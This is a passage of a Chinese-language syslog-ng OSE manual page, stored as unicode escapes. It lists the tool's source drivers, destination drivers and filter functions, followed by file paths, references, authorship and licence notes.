\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502pacct() \u2502 \u4eceLinux\u4e0a\u7684\u8fdb\u7a0b\u8bb0\u5e10\u65e5\u5fd7\u4e2d\u8bfb\u53d6\u6d88\u606f \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502program() \u2502 \u6253\u5f00\u6307\u5b9a\u7684\u5e94\u7528\u7a0b\u5e8f\u5e76\u4ece\u5176\u6807\u51c6\u8f93\u51fa\u4e2d\u8bfb\u53d6\u6d88\u606f\u3002 \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502sun-stream(), sun-streams() \u2502\u5728Solaris\u7cfb\u7edf\u4e0a\u6253\u5f00\u6307\u5b9a\u7684STREAMS\u8bbe\u5907\u5e76\u8bfb\u53d6\u4f20\u5165\u6d88\u606f\u3002 \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502syslog() \u2502 \u4f7f\u7528\u65b0\u7684IETF\u6807\u51c6syslog\u534f\u8bae\u4fa6\u542c\u4f20\u5165\u6d88\u606f\u3002 | \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502system() \u2502 \u81ea\u52a8\u68c0\u6d4bsyslog ng OSE\u5728\u54ea\u4e2a\u5e73\u53f0\u4e0a\u8fd0\u884c\uff0c\u5e76\u6536\u96c6\u8be5\u5e73\u53f0\u7684\u672c\u673a\u65e5\u5fd7\u6d88\u606f\u3002\u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502tcp(), tcp6() \u2502 \u5206\u522b\u901a\u8fc7IPv4\u548cIPv6\u7f51\u7edc\u4f7f\u7528BSD syslog\u534f\u8bae\u5728\u6307\u5b9a\u7684TCP\u7aef\u53e3\u4e0a\u4fa6\u542c\u4f20\u5165\u6d88\u606f\u3002\u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502udp(), udp6() \u2502 \u5206\u522b\u901a\u8fc7IPv4\u548cIPv6\u7f51\u7edc\u4f7f\u7528BSD syslog\u534f\u8bae\u5728\u6307\u5b9a\u7684UDP\u7aef\u53e3\u4e0a\u4fa6\u542c\u4f20\u5165\u6d88\u606f\u3002\u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502unix-dgram() \u2502 \u4ee5SOCK_DGRAM\u6a21\u5f0f\u6253\u5f00\u6307\u5b9a\u7684unix\u5957\u63a5\u5b57\u5e76\u4fa6\u542c\u4f20\u5165\u6d88\u606f\u3002 \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502unix-stream() \u2502 \u4ee5SOCK_STREAM\u6a21\u5f0f\u6253\u5f00\u6307\u5b9a\u7684unix\u5957\u63a5\u5b57\u5e76\u4fa6\u542c\u4f20\u5165\u6d88\u606f\u3002 \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u8868 2. syslog ng\u4e2d\u53ef\u7528\u7684\u76ee\u6807\u9a71\u52a8\u7a0b\u5e8f \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502\u540d\u5b57 \u2502 \u63cf\u8ff0 \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502file() \u2502 \u5c06\u6d88\u606f\u5199\u5165\u6307\u5b9a\u7684\u6587\u4ef6\u3002 \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502fifo(), pipe() \u2502 \u5c06\u6d88\u606f\u5199\u5165\u6307\u5b9a\u7684\u547d\u540d\u7ba1\u9053\u3002 \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502program() \u2502 \u5206\u53c9\u5e76\u542f\u52a8\u6307\u5b9a\u7684\u7a0b\u5e8f\uff0c\u5e76\u5411\u5176\u6807\u51c6\u8f93\u5165\u53d1\u9001\u6d88\u606f\u3002 \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502sql() \u2502 \u5c06\u6d88\u606f\u53d1\u9001\u5230SQL\u6570\u636e\u5e93\u3002\u9664\u4e86\u6807\u51c6\u7684syslog ng\u5305\u4e4b\u5916\uff0csql\uff08\uff09\u76ee\u6807\u8fd8\u9700\u8981\u5b89\u88c5\u7279\u5b9a\u4e8e\u6570\u636e\u5e93\u7684\u5305\u3002\u8bf7\u53c2\u9605\uff1f\uff1f\u4e2d\u9002\u7528\u4e8e\u60a8\u7684\u5e73\u53f0\u7684\u90e8\u5206\uff1f\uff1f\uff1f\u3002 \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502syslog() \u2502 \u4f7f\u7528IETF\u7cfb\u7edf\u65e5\u5fd7\u534f\u8bae\u5c06\u6d88\u606f\u53d1\u9001\u5230\u6307\u5b9a\u7684\u8fdc\u7a0b\u4e3b\u673a\u3002IETF\u6807\u51c6\u652f\u6301\u4f7f\u7528UDP\u3001TCP\u548cTLS\u7f51\u7edc\u534f\u8bae\u7684\u6d88\u606f\u4f20\u8f93\u3002 \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502tcp() and tcp6() \u2502 \u5206\u522b\u901a\u8fc7IPv4\u548cIPv6\u4f7f\u7528BSD syslog\u534f\u8bae\u5c06\u6d88\u606f\u53d1\u9001\u5230\u8fdc\u7a0b\u4e3b\u673a\u7684\u6307\u5b9aTCP\u7aef\u53e3\u3002\u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502udp() and udp6() \u2502 \u5206\u522b\u901a\u8fc7IPv4\u548cIPv6\u4f7f\u7528BSD syslog\u534f\u8bae\u5c06\u6d88\u606f\u53d1\u9001\u5230\u8fdc\u7a0b\u4e3b\u673a\u7684\u6307\u5b9aUDP\u7aef\u53e3\u3002\u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502unix-dgram() \u2502 \u4ee5SOCK_DGRAM\u6837\u5f0f\uff08BSD\uff09\u5c06\u6d88\u606f\u53d1\u9001\u5230\u6307\u5b9a\u7684unix\u5957\u63a5\u5b57\u3002 | \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502unix-stream() \u2502 \u4ee5SOCK_STREAM\u6837\u5f0f\uff08Linux\uff09\u5c06\u6d88\u606f\u53d1\u9001\u5230\u6307\u5b9a\u7684unix\u5957\u63a5\u5b57\u3002 \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502usertty() \u2502 \u5982\u679c\u6307\u5b9a\u7528\u6237\u5df2\u767b\u5f55\uff0c\u5219\u5411\u8be5\u7528\u6237\u7684\u7ec8\u7aef\u53d1\u9001\u6d88\u606f\u3002 \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 Table 3. syslog ng OSE\u4e2d\u53ef\u7528\u7684\u7b5b\u9009\u51fd\u6570 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502Name \u2502 Description \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502facility() \u2502 \u6839\u636e\u53d1\u9001\u529f\u80fd\u7b5b\u9009\u90ae\u4ef6\u3002 \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502filter() \u2502 \u8c03\u7528\u53e6\u4e00\u4e2a\u7b5b\u9009\u5668\u51fd\u6570\u3002 \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502host() \u2502 \u6839\u636e\u53d1\u9001\u4e3b\u673a\u7b5b\u9009\u90ae\u4ef6\u3002 \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502level() or priority() \u2502 \u6839\u636e\u90ae\u4ef6\u7684\u4f18\u5148\u7ea7\u7b5b\u9009\u90ae\u4ef6\u3002 \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502match() \u2502 \u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u53ef\u4ee5\u6839\u636e\u6307\u5b9a\u7684\u6807\u5934\u6216\u5185\u5bb9\u5b57\u6bb5\u7b5b\u9009\u6d88\u606f\u3002 \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502message() \u2502 \u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u6839\u636e\u90ae\u4ef6\u5185\u5bb9\u7b5b\u9009\u90ae\u4ef6\u3002 \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502netmask() \u2502 \u6839\u636e\u53d1\u9001\u4e3b\u673a\u7684IP\u5730\u5740\u7b5b\u9009\u90ae\u4ef6\u3002 \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502program() \u2502 \u6839\u636e\u53d1\u9001\u5e94\u7528\u7a0b\u5e8f\u7b5b\u9009\u90ae\u4ef6\u3002 \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502source() \u2502 \u9009\u62e9\u6307\u5b9asyslog ng OSE\u6e90\u8bed\u53e5\u7684\u6d88\u606f\u3002 \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502tags() \u2502 \u9009\u62e9\u5177\u6709\u6307\u5b9a\u6807\u8bb0\u7684\u90ae\u4ef6\u3002 \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u6587\u4ef6 /home/algernon/install/syslog-ng/3.5/ /home/algernon/install/syslog-ng/3.5/etc/syslog-ng.conf SEE ALSO syslog-ng(8) The syslog-ng OSE 3.3 Administrator Guide[1] \u5982\u679c\u60a8\u5728\u4f7f\u7528syslog ng\u65f6\u9047\u5230\u4efb\u4f55\u95ee\u9898\u6216\u9700\u8981\u5e2e\u52a9\uff0c\u8bf7\u8bbf\u95eesyslog ng wiki[3]\u6216syslog ng\u90ae\u4ef6\u5217\u8868[4]\u3002 \u6709\u5173syslog ng\u7684\u65b0\u95fb\u548c\u901a\u77e5\uff0c\u8bf7\u8bbf\u95eesyslog ng Insider\u535a\u5ba2[5]\u3002 \u4f5c\u8005 \u672c\u624b\u518c\u9875\u7531BalaBit\u6587\u6863\u56e2\u961f\u7f16\u5199<documentation@balabit.com>\u3002 COPYRIGHT \u4f5c\u8005\u6839\u636eGNU\u901a\u7528\u516c\u5171\u8bb8\u53ef\u8bc1\u7b2c2\u7248\u6216\u66f4\u65b0\u7248\u672c\uff08GPL v2+\uff09\u7684\u6761\u6b3e\uff0c\u6388\u4e88\u590d\u5236\u3001\u5206\u53d1\u548c/\u6216\u4fee\u6539\u672c\u624b\u518c\u9875\u9762\u7684\u6743\u9650\u3002 NOTES 1. \u300asyslog ng\u5f00\u653e\u6e90\u4ee3\u7801\u7248\u7ba1\u7406\u5458\u6307\u5357\u300b http://www.balabit.com/support/documentation/ 2. syslog ng\u5b98\u65b9\u7f51\u7ad9 http://www.balabit.com/network-security/syslog-ng/ 3. \u8bbf\u95eesyslog ng wiki http://www.balabit.com/wiki/syslog-ng-faq 4. syslog ng\u90ae\u4ef6\u5217\u8868 https://lists.balabit.hu/mailman/listinfo/syslog-ng 5. syslog 